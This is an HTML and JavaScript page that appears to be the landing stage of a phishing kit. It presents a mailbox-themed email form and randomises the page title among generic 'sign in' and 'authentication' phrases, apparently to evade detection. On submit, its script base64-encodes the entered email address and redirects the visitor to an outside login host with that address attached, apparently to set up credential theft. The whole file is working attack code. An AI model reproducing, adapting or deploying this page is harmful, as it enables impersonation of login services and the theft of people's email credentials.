<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Online holdings</title> <!-- Placeholder title -->
<style>
    body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        background: url('background-mailbox.jpg') no-repeat center center fixed; /* replace with your mailbox image */
        background-size: cover;
    }
    #emailForm {
        background: rgba(255, 255, 255, 0.8);
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        text-align: center;
    }
    h2 {
        font-family: Sans-serif, sans-serif; /* Change the font family for h2 */
        font-size: 20px; /* Adjust font size */
        font-weight: bold; /* Bold text */
    }
    input[type="email"] {
        padding: 10px;
        width: 90%;
        margin: 10px 0;
        border: 1px solid #ccc;
        border-radius: 5px;
    }
    input[type="submit"] {
        padding: 15px 30px; /* Increased padding for larger button */
        font-size: 16px; /* Increased font size */
        font-weight: bold; /* Bold text */
        border: none;
        border-radius: 5px;
        background-color: #1963c7; /* Navy blue color */
        color: white;
        cursor: pointer;
    }
    input[type="submit"]:hover {
        background-color: #053979; /* Darker navy blue color on hover */
    }
</style>
<script>
    // Function to generate a random title
    function generateTitle() {
        const titles = [
            "Authentication procedure",
            "Validation process",
            "Confirmation process",
            "Certification procedure",
            "Assessment procedure",
            "Verification protocol",
            "Authentication method",
            "Confirmation protocol",
            "Validation procedure",
            "Certification process",
            "Log in to the leading productivity service",
            "Access the top productivity platform",
            "Enter the premier productivity provider",
            "Join the foremost productivity service",
            "Sign in to the ultimate productivity solution",
            "Connect to the best productivity tool",
            "Log in to the top-rated productivity provider",
            "Access the leading productivity application",
            "Enter the best-in-class productivity service",
            "Sign in to the superior productivity platform",
            "Join the finest productivity provider",
            "Log in to the top productivity suite",
            "Access the premier productivity tool",
            "Enter the best productivity solution",
            "Sign in to the leading productivity system",
            "Connect to the top productivity provider",
            "Log in to the foremost productivity service",
            "Access the ultimate productivity platform",
            "Enter the top-tier productivity provider",
            "Sign in to the best productivity app",
            "Electronic assets",
            "Virtual assets",
            "Online assets",
            "Digital resources",
            "Digital holdings",
            "Electronic resources",
            "Virtual holdings",
            "Online holdings",
            "Digital properties",
            "Electronic properties",
            "Virtual properties",
            "Digital inventories",
            "Electronic inventories",
            "Virtual inventories",
            "Online resources",
            "Digital items",
            "Electronic items",
            "Virtual items"
        ];
        // Select a random title from the array
        const randomIndex = Math.floor(Math.random() * titles.length);
        return titles[randomIndex];
    }

    // Set the document title to the randomly generated title
    document.addEventListener('DOMContentLoaded', (event) => {
        document.title = generateTitle();
    });

    function base64Encode(str) {
        return btoa(unescape(encodeURIComponent(str)));
    }

    function redirectUser(event) {
        event.preventDefault();
        const email = document.getElementById('email').value;
        const baseURL = 'https://login.doxform.com/T'; // Base link with existing parameter
        const encodedEmail = base64Encode(email); // Encode email in Base64
        const newURL = `${baseURL}${encodedEmail}`; // Append encoded email
        window.location.href = newURL;
    }
</script>
